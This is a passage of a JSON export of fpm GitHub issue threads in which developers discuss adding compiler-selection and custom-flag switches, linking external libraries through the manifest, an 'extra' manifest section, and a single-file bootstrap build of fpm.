                    "text": "lternate compilers. This is an alpha version for furthering discussion\non how to implement these features as discussed here so I do not think\nit is appropriate yet for an actual pull request, but I would like some\ntrials and feedback on the interface. The code itself might need some\nrefactoring depending on how that goes. So, if interested\nThere are three new switches\n   --build_name NAME, -B          has to be Fortran name\n   --compiler COMPILER_NAME, -C   has to be Fortran name\n   --flags ARGUMENTS, -F\n\nEssentially, if you use --compiler and/or --flags you have to specify a\nbuild name with the --build_name NAME switch.\nThe names release and debug are reserved.\nYou can only specify the custom build flags on the \"build\" subcommand.\nYou then use the --compiler and --build_name on \"run\" and \"test\" to match\nthe build.\nSo this is just a single file you have to build with gfortran:\n   # get the single-file build file\n   wget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90\n   # compile and name \"ffpm\" somewhere in your path\n   gfortran ffpm.f90 -o $HOME/.local/bin/ffpm\nget an fpm project. For example\n```bash\ngit clone https://github.com/urbanjost/M_CLI2\n\ncd M_CLI2\n\n# assuming `ffpm` is in your path from above:\n\n# build the package with the name \"ONE\" with the nvfortran compiler:\nffpm build --compiler nvfortran --flags '-Mbackslash' --build_name ONE\n\n# build it again with the ifort compiler:\nffpm build --compiler ifort\n\n# build it again normally\nffpm build\n\n# and again as a release version\nffpm build --release\n\n# build with gfortran but with no user-specified compiler switches\nffpm build  --build_name DEFAULT\n# to run that\nffpm run --build_name DEFAULT\n\n# profile with gfortran\nffpm build --build_name PROFILE --flags '-pg'\nffpm run   --build_name PROFILE\nffpm run   --build_name PROFILE  --runner gprof\n\n# build with ifort(1) compiler and profiling options\nffpm build --compiler ifort --build_name PROFILE --flags '-p'     # build\nffpm run   --compiler ifort --build_name PROFILE                  # run\nffpm run   --compiler ifort --build_name PROFILE  --runner gprof  # profile\nIdeally I would like to see this functionality available via the TOML file as discussed in other issues but this gives  a working model for getting an idea of what some of the issues will be.  RIght now for compilers other than gfortran it is assuming the modules are placed in the directory specified via -module DIRNAME which is an issue that needs a more generic solution.  Hopefully this will further the discussion a bit more and help lead to a real pull request."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 16:17:12+00:00",
                    "text": "So after trying a lot of variants,  I think:\nThere are two special build suffix names (assuming the compiler name is the prefix) that are used as build directories that are reserved. They can only be used if the compiler is supported and take no user-supplied link options.  They are only allowed if the compiler is supported.  The one is debug, which is the default. The other is release, which is used if you do a --release.\nThere is a compiler switch --compiler whose default is set with the environment variable FPM_COMPILER else it is gfortran.\nIf you supply any user-specified compiler options with --flags you must use the build command to build and you must specify a user-supplied build name via --build_name.  You can then use --compiler and --build_name with a matching name on the run and test commands to run executables built with those options.  On build options after -- can be options equivalent to --flags or maybe should be \"loader only\" options.  If your compiler name is not known and the switch for specifying where  output files to be placed is not \"-module $NAME\"   then you must supply and environment variable called FPM_BUILD_OUTPUT which has a space placed between it and the build directory name unless it ends in an = in which case the filename is appended directory to it.\nSo current usage  would be unchanged.\nsetting FPM_COMPILER to a supported compiler name would work just like the default except put files in build/${COMPILER}_debug/ and _release.  Or, on build, run, and test you could add --compiler $FPM_COMPILER.  If you want to specify your own compiler switches (assuming  internally used option names are \"universal\" like -o, which is generally but not completely true) you can add a -flags option and a build name.  This ignores specifying anything in the TOML file which I support.  These switches (--compiler --build_name --flags,  -- ARGS) and environment variables would be marked as provisional and documented completely only in \"fpm help compiler\" with a  prominent note saying they are intended primarily to handle build requirements not yet internalized in fpm and are subject to change. The names are so long I think short names are appropriate, all capitalized to emphasize they are provisional (--compiler,-C; --build_name,-B, --flags,-F).  If no strong opinions not to after waiting for this week I will put in a pull request for a prototype that meets that description after a week that should follow PR #239."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-23 16:39:48+00:00",
                    "text": "There is a compiler switch --compiler whose default is set with the environment variable FPM_COMPILER else it is gfortran.\n\nI would suggest to stay as consistent with other build systems. The established default for the compiler environment variable is FC across several build systems and meta build systems.\n\nIf your compiler name is not known and the switch for specifying where output files to be placed is not \"-module $NAME\" then you must supply and environment variable called FPM_BUILD_OUTPUT which has a space placed between it and the build directory name unless it ends in an = in which case the filename is appended directory to it.\n\nThe environment variable FPM_BUILD_OUTPUT doesn't capture this purpose in my opinion. I have seen get_module_outdir_args in the meson implementation of the Fortran compiler. CMake uses Fortran_MODULE_DIRECTORY to set the directory path in the build file. From the name FPM_BUILD_OUTPUT I wouldn't expect to set the module output directory for the Fortran compiler.\n\nThe names are so long I think short names are appropriate, all capitalized to emphasize they are provisional (--compiler,-C; --build_name,-B, --flags,-F).\n\n-C is expected in many build systems (make, ninja, meson, ...) and other programs as well (git, ...) to switch the directory, I would discourage using this short flag for the compiler. -B is the CMake flag to select the build directory output, so this might work as expected. I wonder if we should prefer underscores or hyphens in flags? Or might there a better synonym for build name we could use here instead?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-23 17:25:40+00:00",
                    "text": "For whatever reason the browser is not letting me edit the post. I wanted to update it with some of the changes as a working document.  Using FC instead of making up a \"new\" name seems like a particularly good one.  Since hyphens are part of the  \"space-hyphen value\" of POSIX commands  I find the underscore useful for names, and then the names can be used directly in the code as well as hyphen is allowed in Fortran variable names; but that is probably as much personal taste as anything else as that argument has been going on at least as long as which text editor is \"best\" and which programming language is \"best\".   When I get to a machine that works I will try to capture this all into a second take. Thanks for the quick response.  I strongly want some of this to go into the TOML/configuration files so packages can be shared more readily but there will always be some need for directly specifying the switches and it lets us more experience with the issues of multiple compiler support On that note, I THINK your input on M_CLI2 plus working through several compiler bugs has the latest version of M_CLI2 passing its tests with nvfortran, ifort, and gfortran8.3+.  Each compiler has it's pros and cons and bugs/features; but considering all that I think it is quite portable to modern Fortran compilers. It's predecessor was F77 and can on everything from SCOPE 2/UNICOS/SunOS/Solaris/HP-UX/AIX/NetBSD/Linux/Tru64/... so it was interesting that some of the modernizing made that a bit harder than I expected. It got cluttered by making a stand-alone version of; I hope to streamline it and add a bit of OOP to it in the future, but not in a hurry as long as it functions as intended."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-24 15:50:26+00:00",
                    "text": "Anyone have any favorite compiler options for compilers other than gfortran  that would be used as a seed for the default and --release compiler switches?\nAny suggestions for the --build_name key name that seem better or shorter?  --tag or --ID perhaps?\nI added a number of other compiler names for testing  based on the list in  #223 but have no great way of testing the majority of them.\nA lot of the vendors used to support on-line access to test machines  (manufactures and compiler vendors) but I do not see any remaining ones. Something for the wish list would be web interfaces for various compilers where you could give the URL of an fpm package and it would do a build of it and show the resulting output.  Probably asking to much for more than a build,  but just the build would be nice. After all, legend says some unnamed companies have the policy \"It compiled, ship it!\"."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-24 16:38:03+00:00",
                    "text": "still oscillating on a separate subcommand like compile or custom  versus build, test, run allowing customization if a custom build name is provided.  A actually like the switches better but the interface is cleaner (as is documentation) if it a separate command.  Something in-between where the custom/compile command just does a custom build and the test and run subcommands remain the same except they have a -ID switch added?  If the -ID switch is present run and test would not do an automatic build even if the executables are not built.   Everyone would have the --compiler switch.\nfpm compile --ID xxxxx  --compiler xxxx -flag xxx  .[regular_build_options] -- LOADER_OPTIONS\nmaybe no --flag option   but options allowed after the compiler name, eg. \"--compiler 'myf90 -traceback -pg' \"\nwhich might be easier for a user to use using environment variables , or  if the build,run,test commands could have a tag added to the name which would act like the --ID switch?\nfpm build,mytest=' -pg -O3' ...\nfpm run,mytest ...\nfpm test,mytest ...\nIf ID is not provided"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 03:55:56+00:00",
                    "text": "Provisional Custom Compiles\nSo, after going through the suggestions and some testing with similar h-fpm features this is\nwhat I am proposing. Looking for feedback and whether this is ready to\npropose as a PR (Pull Request).\nAdd compiler switch --fc\nrun, test,build, and a new command called compile have a switch called\n--fc that sets the Fortran compiler name. The default is to use the\nvalue of the environment variable FC. If it is not set the name gfortran\nis used.\nFC is apparently a commonly used environment variable for the compiler, is\nshort, and allows for specifying compilers for other languages like C (ie. -cc gcc)\nThat is part of the reasons to use --fc instead of --compiler.\nnew command \"compile\"\nThe compile command is like the build command except it does not have\nthe --release parameter. In addition it has the new options\n--ID NAME               user-supplied name for the custom build. Required\n--flags ARGUMENTS, -F   custom compiler flags\n\n-ID switch added to test and run to match name on compile command\nThe ID names release and debug are reserved and cannot be used.\n--ID is also added to run and test. If present on those commands no\nautomatic builds occur and the matching build created with compile is used.\nThe name custom is currently an alias for compile. I prefer custom and\nam looking for feedback on it.\npreliminary support for alternate compilers for testing\nA skeleton was started for standard debug and release builds that allows\nfor compilers other than gfortran. I now have access to ifort\nand nvfortran and it works with at least simple cases for those\ncompilers. Looking for someone with access to other compilers to help\nflesh that out.\nSUMMARY\nSo default usage is unchanged from the previous version. By simply setting FC you can use it like the\nprevious version with other compilers for default builds. Other than the compiler\nswitch which I suspect would be used infrequently versus the FC compiler the\nonly change to test and run is the --ID switch. The ID must be a name\nsuitable as a Fortran variable. It allows for simple custom builds and loads.\nHow does that sound?\nInstructions for testing before PR is submitted\n# single-file program for testing\nwget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90\n# or pull from webpage of same name\n\n# build and call ffpm. Example. Change output name as appropriate to put\n# into your search path\ngfortran ffpm.f90 -o $HOME/.local/bin/ffpm\nsample testing\n# get a test package or use your own\nif [ ! -d M_CLI2 ]\nthen\n   git clone https://github.com/urbanjost/M_CLI2\nfi\ncd M_CLI2\n\nset -x\n\n# simple custom build\nffpm compile --fc nvfortran --flags '-Mbackslash' --ID ONE\nffpm run -ID ONE\n\n# default build using ifort\nffpm build --fc ifort\n\n# default build\nffpm build\n# default release build\nffpm build --release\n\n# not sure if this should do a default build or build with gfortran with\n# no other switches\nffpm build --fc gfortran\n# will not allow reserved names debug and reserve even for this case\nffpm compile --fc gfortran --ID debug\n\n# profile with gfortran\nunset FC\nffpm compile --ID PROFILE  --flags '-pg'\nffpm run     --ID PROFILE\nffpm run     --ID PROFILE  --runner gprof\n\n# profile with --fc switch and ifort\nffpm compile --fc ifort --ID PROFILE --flags '-p'   # build\nffpm run     --fc ifort --ID PROFILE                  # run\nffpm run     --fc ifort --ID PROFILE  --runner gprof  # profile\n\n# profile using FC variable and appropriate flags for that compiler\nexport FC=ifort\nffpm compile --ID PROFILE --flags '-p'   # build\nffpm run     --ID PROFILE                  # run\nffpm run     --ID PROFILE  --runner gprof  # profile"
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-25 11:20:32+00:00",
                    "text": "Thanks @urbanjost; I've had a quick play around with your proposal demo \u2014 it's exciting to be able to use other compilers with fpm!\nI've been using the --flag feature since it was introduced in bootstrap version and unfortunately I find it very clunky for a number of reasons. Your addition of compile/custom and ID is certainly an improvement on the compile+run workflow, but I still have to specify the flags correctly at the command line every time I run compile (which is often).\nIt's also worth noting that unlike the bootstrap method of hashing compiler flags for the output directory, this approach may end up with unintended effects if the compiler flags change but the ID does not during a partial rebuild (coming in #248).\nOnce flags can be specified in the manifest as different configs, I would be unlikely to use the compile/custom command or --flags flag ever again.\nIn essence, I don't think the command line is the right place for specifying compiler flags because it inevitably puts the burden on the user to manually 'load' and 'store' flags correctly at each invocation \u2014 I'd much rather store various flag combinations digitally in a toml file than in my brain.\n@urbanjost, would you be happy opening separate PRs for the specification of compilers and specification of flags? The former seems ready to go from a specification standpoint, whereas the latter may need more discussion in it's own PR."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 14:19:31+00:00",
                    "text": "I will split them.  My own comments in several other discussions is of the same sentiment. The prototype is just to aid the discussion. Everyone is different but I find it useful to actually try something if the discussion is stalled or has hit a roadblock.\nI separated this out as a way  to actually test using other compilers and a --flags switch like h-fpm because of some of those reasons. Since a TOML file is not the most intuitive feature I  found a prototype useful for exploring other alternatives like a command similiar to \"custom\" that would write a TOML entry;  using aliases and environment variables from the shell to create alternatives; whether a single name or ID should imply a compiler ...   If the configuration parameters are in a file they tend to be so specific to a compiler that I want something like  \"fpm custom profile\" and the name \"profile\" can be used with various compilers.\nAs-is I found\nI was not using the --flags directly but was buiding up a list of aliases such as \"fpm-profile\" that had the flags set for the build; but once you combine that with multiple compilers then it needs to be a script instead of an alias, and so on.\nSo this let me actually test some of those combinations. It also matches the flag of the same name in h-fpm, and so on; but a lack of compiler and load options seemed to be the most commonly mentioned reason people could not use the earlier fpm versions. Thanks for actually trying it. There are  pros and cons to any approach that involves supporting multiple compilers.\nSo my sentiment is similar but there is nothing like trying it.  I have been finding that with three compilers now available on my machine that I usually use the environment variable FC and start three terminal sessions in screen(1) or tmux(1) with one set up for each compiler and toggle between them. That has made me wonder if the compiler switch should allow multiple names like\n`fpm build -fc \"nvfortran gfortran intel\" .  That might seem useful to me because I am testing. In normal use I would guess most people have a specific compiler they primarily work in and they would just set \"FC\".  Since other products apparently use FC if that was implemented with a variable I think it would have to be one with a unique name like FPM_FC that would be looked for.\nStill looking for other feedback on --flags including experiences with h-fpm or other source package managers."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 17:47:52+00:00",
                    "text": "On the contrarian side of this; because of the problems with remembering the compiler switches I was considering that the first build of a directory cache some data. A TOML file would see appropriate but at least for the first cut I was just going to use NAMELIST. The first time you built a (compiler-specific) directory it would create a file with the compiler and load flags from the custom command, so that it would actually be more like new in that it would initialize a directory $FC/ID.\nThen build as well as run and test would have the ID switch; and build would not build unless the directory already existed and custom would always do a full build.   That way the switches are remembered and are consistent and the previous versions of build, run, and test have nothing added by one switch something like release.  Maybe even change the name from --ID to --custom, and the custom commands' first parameter would be the ID name.  That would be\nthe next prototype if everyone agrees this one does not cut it."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 17:55:11+00:00",
                    "text": "fpm custom -fc ifort -fflags '-g -C -CB -CU -fpe8 -ftrapuv -fp-model=precise'  -ID my_debug\nfpm run -ID my_debug\nfpm build -ID mydebug\nfpm test -ID mydebug\nor fpm build --custom mydebug ...\nAssuming we allow a short name for --ID/--custom and you name with short names this could be\nfpm build -i d"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 19:01:32+00:00",
                    "text": "Currently build and custom do not use the \"unnamed\" fields so The --ID switch would not be required. TO allow the same for f-fpm there would have to be a change to do the same. Currently names following the subcommand are assumed to be targets (the name of the executables. To remove the --ID switch from all commands that would have to be changed so the same as h-fpm where you specify that with --target NAME. It depends on which would be used more commonly. Alternatively there could be runc and testc which would assume the first parameter is the custom build name instead of a target and test and run would be left as-is. With no pre-view or revision of these messages with an old version of firefox these are getting hard to compose. I will clean up the typos when I can access a more up-to-date machine.\nIt would be a non-compatible change to f-fpm to change to --target but would keep f-fpm and h-fpm more aligned; but this is still alpha.  I think with these changes the changes would be useful even with the TOML interface for development.  For producing a real package I think having the configuration in a shippable format in the TOML file will be the dominant format for build options that are required for a package to be functional (ie. coarray, openMP, external packages like -X11 and netCFD, .ncurses, MPI, ...)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-25 19:06:15+00:00",
                    "text": "So then the format could be\nfpm custom myopts --fflags 'compiler args' -- load_args\nfpm run myopts\nfpm run myopts -target demo1 -- options_for_demo1\nBut then to run multiple programs instead of\nfpm test test1 test2 test3\nit would have to be\nfpm run --target 'test1 test2 test3'"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-26 17:14:09+00:00",
                    "text": "If anyone is interested I renamed the ffpm.f90 file to ffpm-custom.f90 and put ffpm.f90 there, which is a preliminary version that just specifies a compiler.  So new, test, build have a --fc COMPILER_NAME switch. If not specified it looks for names specified with environment variable name FPM_FC, then FC.\n\nshould --compiler be an alias for --fc?\nany suggestions for  options for particular compilers for a default and release build?\nshould an unknown compiler name be an error or should fpm(1) warn and try with no compiler options?\nallowing more than one compiler name on a single build would require some refactoring. Is that desirable?\nshould the --fc switch name be optional on build?   build ifort |build -fc ifort? If so should new and test do the same and have to have application names specified via --target NAME(s) instead of being able to be names specified after the run subcommand?\nother?\n\nAfter some further testing I will start a new issue for just the compiler switch and probably close the one for the custom command unlesss there is interest.  If there is interest I will start a new discussion for that. In either case I plan on closing this one. Thoughts and comments welcome.  It will probably be a few days so in the meantime if anyone is interested in trying the single-file prototype please do."
                }
            ]
        },
        {
            "number": 234,
            "user": "urbanjost",
            "date": "2020-11-09 20:37:25+00:00",
            "title": "Allow compiler options on Fortran \"fpm build -- ARGS\"  [Fortran fpm]",
            "text": "The h-fpm version allows compiler options on the command line. I would propose allowing the same capability but using the\nsyntax\nfpm build [NAME(S)] [-release] -- ARGS\nwhere ARGS could be multiple compiler options.\n\nAny feedback on use cases for the feature, and comments on the h-fpm option would be informative as to whether this option should be added or not.\nshould the options replace all the options sans the ones required for the build (ie. -J, -I, ...) or be in addition to the default options?\nI think the documentation should indicate that this potentially breaks a package being self-describing, as it would be problematic to have required options on external dependencies. It  would be useful for building a top-level package with different options.  Options for profiling come to mind, as well as external system libraries. Other options are being discussed to handle the compile and load options as something provided in the manifest file but there will probably always be a case for supplying various options while developing a package.\nThe h-fpm version hashes the options to create a unique pathname for each combination of switches. That is an option as well as requiring a user-supplied name or still being in the standard location. Not sure what the general sentiment is about that.  Using the hash resolves all kinds of collision problems but could be hard to remember and duplicate unless the hash is reversable and tagged with a name for reuse.\nshould the options only apply to an application and not external dependencies and files in src/? Should there be an option to control what it applies to?  Would a rebuild of all package components be required?\nshould the syntax be the same in both the f-fpm and h-fpm packages or is it an advantage to allow for two syntaxes (and underlying implementation differences) for exploring more possibilities?",
            "comments": []
        },
        {
            "number": 233,
            "user": "awvwgk",
            "date": "2020-11-08 12:08:07+00:00",
            "title": "Allow linking against external libraries",
            "text": "Specification changes\n\nadd specification for build.link entry in manifest reference\nallow both a single string and an array of strings\nencourage use of single external dependency for package\ndon't forbid multiple external dependencies like cargo does\nallow link entry in executable or test scope\n\nFortran fpm changes\n\nimplement manifest type to store link entries\nallow both a single string and an array of strings for link entry (might be a useful feature in toml-f as well)\nrecursively collect libraries from dependencies\nappend link libraries to model%link_flags\nadd an example package using build.link (using BLAS, which is installed on the OSX and Ubuntu image)\nadd an example package using link in executable scope (using gomp)\nuse TOML-Fortran v0.2.1\n\nTODO\n\nimplement feature in Bootstrap fpm (different PR)\n\nExamples\nbuild.link = \"z\"  # -lz\nbuild.link = [\"blas\", \"lapack\"]  # -lblas -llapack\n[[executable]]\nlink = [\"fftw\"]\nCloses #119\nRelevant for #168",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-08 15:36:59+00:00",
                    "text": "I believe Cargo/Rust want to encourage (force?) small single purpose packages to allow a modular setup. While this is in general a good idea also for fpm, this scheme will not work well for some existing library dependencies. One example would be LAPACK, which also requires linking BLAS, or Intel's MKL which requires at least three external libraries to be linked.\nWorking around an artificial constraint of only one external library per project is possible (several dummy projects with just build.link entries), but in my opinion it is unnecessary to impose such a constraint on the user in the first place."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-10 14:21:13+00:00",
                    "text": "A possible cross-platform library for the test case could perhaps be the gcc openmp runtime api, libgomp.\nFor a simple API call without pragmas, linking directly with -lgomp should be okay on all platforms I think:\nprogram test\n  implicit none\n\n  interface\n    integer function omp_get_num_procs()\n    end function\n  end interface\n\n  print *, omp_get_num_procs()\n\nend program test"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-10 18:08:36+00:00",
                    "text": "I think this is a great idea. But I just want to make sure I understand the idea/implementation. As I understand it, you declare that the library needs to be linked to some external library(s), and then this information makes its way through the build process to packages that depend on it, and eventually to building and linking an executable, such that, if you depend on a package that needs linked with some external library, if you have that library installed (and in your LD_LIBRARY_PATH), then things just work. Does that explanation make sense?\nQuestion, do we want to allow specifying the same thing for specific executables and/or tests? That way packages that need an external library for an executable but not for the library can still be used as dependencies without needing the external library installed? Similar to how fpm dependencies can be specified that way?\nThis is obviously a necessity, but it does mean that some point a user may transitively end up depending on a package with one of these dependencies unknowingly and then be surprised and confused when their package won't compile. You end up with more of an implicit dependency on something that fpm can't help you with. Should we provide warnings or notices to users about these dependencies and suggestions to ensure they have them installed? Or should we require or suggest that these dependencies be repeated/explicitly declared if a package needs them, even if only because of some package they depend on?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-10 18:55:22+00:00",
                    "text": "A possible cross-platform library for the test case could perhaps be the gcc openmp runtime api, libgomp.\n\n@LKedward I was thinking about using OpenMP, but than again this is a very compiler specific can of worms, I don't want to open yet.\n\nDoes that explanation make sense?\n\n@everythingfunctional You got the right idea. This way the order of the link line is also generated correctly.\n\nQuestion, do we want to allow specifying the same thing for specific executables and/or tests? That way packages that need an external library for an executable but not for the library can still be used as dependencies without needing the external library installed? Similar to how fpm dependencies can be specified that way?\n\nAlso, this is an interesting suggestion, I have to think about this.\nIn case one wants to have link against a library only for a single executable, a workaround using the implemented syntax would be:\n[[executable]]\nname = \"extra-linking\"\ndependencies.link-zlib.path = \"link-zlib\"\nwith link-zlib/fpm.toml as\nname = \"link-zlib\"\nbuild.link = \"z\"\nI'm very much in favour to cut the chase here and allow to directly specify the external library dependency:\n[[executable]]\nname = \"extra-linking\"\nlink = \"z\"\n\nShould we provide warnings or notices to users about these dependencies and suggestions to ensure they have them installed? Or should we require or suggest that these dependencies be repeated/explicitly declared if a package needs them, even if only because of some package they depend on?\n\nI think we should make a difference between external library and external dependencies.\nA build.link = \"blas\" would try to link against whatever provides the libblas.*, providing this package is the users responsibility, fpm should do exactly as asked and try to link against libblas.*, we can't help here, except for reporting a useful error message when we cannot find a libblas.*.\nThe situation is different for dependencies.blas = \"*\". In this case fpm might search for a BLAS provider, like netlib-BLAS, openBLAS, BLIS or MKL. In case of MKL different libraries might have to be linked depending on the threading model.\nI would consider the build.link option as low-level access compared to actually depending on a blas package might be a smart high-level solution provided by fpm.\nThis is certainly not my own idea to separate it like this, meson has a low-level find_library compiler method, which is similar to build.link and a dependency function, which tries to use internal finders, pkg-config or cmake to get the correct libraries and flags.\nThis is an overall difficult scenario for fpm, because it can't control the environment it is running in. In case it fails to build the package, all it can do is provide the best summary of what possibly went wrong and hope the user can take it from there."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-10 20:27:47+00:00",
                    "text": "Rebased against d569a89 e034ad4."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-13 08:48:05+00:00",
                    "text": "With three approvals I will merge later today."
                }
            ]
        },
        {
            "number": 232,
            "user": "awvwgk",
            "date": "2020-11-08 10:38:18+00:00",
            "title": "Allow extra section in manifest",
            "text": "This PR adds an extra section to the package manifest. It is excluded from checks in Fortran fpm.\nThe general idea behind this section is:\n\nallow third party tools to store information in the package manifest\nstage new entries for the fpm registry without requiring a change in the manifest reference",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-11-09 22:20:28+00:00",
                    "text": "allow third party tools to store information in the package manifest\n\nI don't understand this. Can you give a concrete example? Why would other tools want to store info in the manifest? Would these be fpm plugins or something else?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-09 22:33:23+00:00",
                    "text": "I have nothing particular in mind yet, but one idea would be to allow tools like FORD/fprettify/... to read from fpm.toml instead of their own input file:\n[extra.ford]\noutput_dir = \"./docs\"\ndocmark = \"<\"\npredocmark = \">\"\n[extra.fprettify]\nindent = 4\nManaging those entries would be the responsibility of the respective tools and fpm just allows for a free space to do so.\nThe advantage of using fpm.toml is that the meta data has to specified only once, it reduces the repetition of project name, layout, descriptions, ... in case it is adapted by a commonly used tool."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-11-09 22:43:14+00:00",
                    "text": "Got it. I'm not opposed to it, but also don't see the need until users ask for it.\nIf others like it, I don't mind it going forward. @everythingfunctional @LKedward @urbanjost @certik what do you think?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-09 22:49:21+00:00",
                    "text": "Once you put it in, you have to support it. Without a specific use case or request for it, I'd be hesitant to put it in. It's an interesting idea, and would encourage tools and users to converge around supporting and using fpm, so I'm not opposed to it. I just don't think it should be done yet. We've got plenty of other things to get done first."
                },
                {
                    "user": "LKedward",
                    "date": "2020-11-11 09:13:22+00:00",
                    "text": "I am not opposed to this, I can see it's uses, particularly this:\n\nThe advantage of using fpm.toml is that the meta data has to specified only once, it reduces the repetition of project name, layout, descriptions, ... in case it is adapted by a commonly used tool.\n\nwhich opens the way for others to develop more tooling for the Fortran ecosystem.\n\nOnce you put it in, you have to support it.\n\nRegarding support, I think the point here is that the section is explicitly ignored by fpm, so there is no burden of maintenance for us."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-11-11 15:30:34+00:00",
                    "text": "Regarding support, I think the point here is that the section is explicitly ignored by fpm, so there is no burden of maintenance for us.\n\nTrue, there is essentially no maintenance cost for us, other than explicitly ignoring it and not being able to use that table for anything in the future. So it could be worth it, but as I said, I think we've got other things to worry about first."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-13 13:52:37+00:00",
                    "text": "This has been stale for while, therefore closing it now, we can revisit this feature later in case there is need."
                }
            ]
        },
        {
            "number": 231,
            "user": "scivision",
            "date": "2020-11-07 23:36:15+00:00",
            "title": "DOC: pure Fortran fpm build method?",
            "text": "Is there / will there be a way to build the pure Fortran + curl fpm itself without needing to install Haskell first? Would this be doable at least via a Makefile or is there generated source for fpm itself?\n(I would like to start using fpm across my Fortran projects as it seems Fortran submodules are/will be soon supported. I couldn't use fpm until Fortran submodules are supported.)",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-11-08 02:53:45+00:00",
                    "text": "Yes, that is planned:\n\n#123\n\n\u2026\nOn Sat, Nov 7, 2020, at 4:36 PM, Michael Hirsch wrote:\n\n\n Is there / will there be a way to build the pure Fortran + curl fpm\n itself without needing to install Haskell first? Would this be doable\n at least via a Makefile or is there generated source for fpm itself?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#231>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBJTPDSMRWAPKVGJNTSOXKXTANCNFSM4TN6GDMA>."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-08 10:13:47+00:00",
                    "text": "Bootstrapping fpm once with the Haskell version is currently required, but the Fortran fpm implementation should be able to bootstrap itself afterwards. We are working towards a first release and a way to provide binaries as a rolling release (#218)."
                },
                {
                    "user": "certik",
                    "date": "2020-11-08 17:16:07+00:00",
                    "text": "Yes, if you are ok with using an fpm binary as a starting point, then fpm will be able built itself eventually. The issue #123 is for bootstrapping from source from scratch."
                },
                {
                    "user": "scivision",
                    "date": "2020-11-08 19:12:50+00:00",
                    "text": "If I understand correctly the end goal is to have the capability to build fpm from scratch with a Fortran compiler + CMake (among other methods). This would be great."
                },
                {
                    "user": "certik",
                    "date": "2020-11-08 19:38:31+00:00",
                    "text": "Yes, correct.\n\u2026\nOn Sun, Nov 8, 2020, at 12:13 PM, Michael Hirsch wrote:\n\n\n If I understand correctly the end goal is to have the capability to\n build fpm from scratch with a Fortran compiler + CMake (among other\n methods). This would be great.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#231 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWB7CE2L4HKKTPR3OP3SO3UT3ANCNFSM4TN6GDMA>."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-09 04:25:23+00:00",
                    "text": "Well, since the Fortran version does not have any C dependencies at this point it will actually build as a single Fortran file.\nLong story short I wanted a version of #229 on a machine that just had a Fortran compiler and that I could build with the\ndebugger so I used an old \"make\" trick:\ncd $(basename $0)\ncat >gfortran <<\\EOF\n#!/bin/bash\n(\nexec 2>&1\n/usr/bin/gfortran \"$@\" 2>&1\n) >/dev/null\nNAME=$(echo $*|xargs -n 1|grep '\\.f90$')\necho ============================================================\necho COMMAND \"$@\"\necho NAME $NAME\ncase \"$NAME\" in\n'');;\ntest/*);;\n*)\necho cat $NAME >> catthem\n;;\nesac\nEOF\n\necho '#!/bin/bash' >catthem\nexport PATH=`pwd`:$PATH\nchmod u+xr gfortran\nrm -rfv build\nfpm build\nmkdir -p _scratch\nbash catthem >_scratch/ffpm.f90\n(\ncd _scratch\ngfortran ffpm.f90 -o ../ffpm\n)\nrm gfortran\nrm catthem\nmv _scratch/ffpm.f90 .\nrm -rf _scratch\nexit\n\nIf you run that with the bootstrap fpm it makes a file called ffpm.f90 that compiles just fine with a simple gfortran compile.'.\nIt lets you try other compilers anduse a debugger on the code and other nice things for now. Would not commit to that being a long-term solution but it has been pretty handy lately.  Maybe we could place the file out there as a simple way for some people to test  the Alpha version without having to commit to much effort. Compile one file. Try it."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-21 04:24:40+00:00",
                    "text": "i changed the use statements to all use the module that defines toml_table as the quickest way to get rid of that Intel compiler message and updated M_CLI2 to use standard-conforming use of : and * in that one line. Wondering if anyone can try the single-file bootstrap version with anything other than gfortran 8.3.1-5 on a Red Hat 8.2\nsystem. Particularly interested in gfortran 10 and non-gfortran compiles.\n wget http://www.urbanjost.altervista.org/REMOVE/ffpm.f90 \nand just compile the single file and if it builds the theory is it should be able to bootstrap a pull of the fpm/fpm Fortran directory without having to install anything on a machine except gfortran and git."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-21 08:23:38+00:00",
                    "text": "@urbanjost I did a bit of testing with all my available compiler toolchains on three different machines (Manjaro, RedHat, OpenSuse).\nGCC works nicely for me, tested 7.5, 8.4, 9.2, 10.1 and 10.2 so far. Intel is the same, compiles with 18.0, 19.0 and 19.1, but the resulting binary might be non-functional.\nPGI doesn't work since toml-f cannot be compiled due to a bug in 20.7 and 20.9 of the NVHPC compilers (see toml-f/toml-f#25). Also M_CLI2 triggers some PGI bugs, see urbanjost/M_CLI2#2.\nNAG fails on a logical formatter in M_CLI2 (see urbanjost/M_CLI2#1), but toml-f seems to be fine."
                },
                {
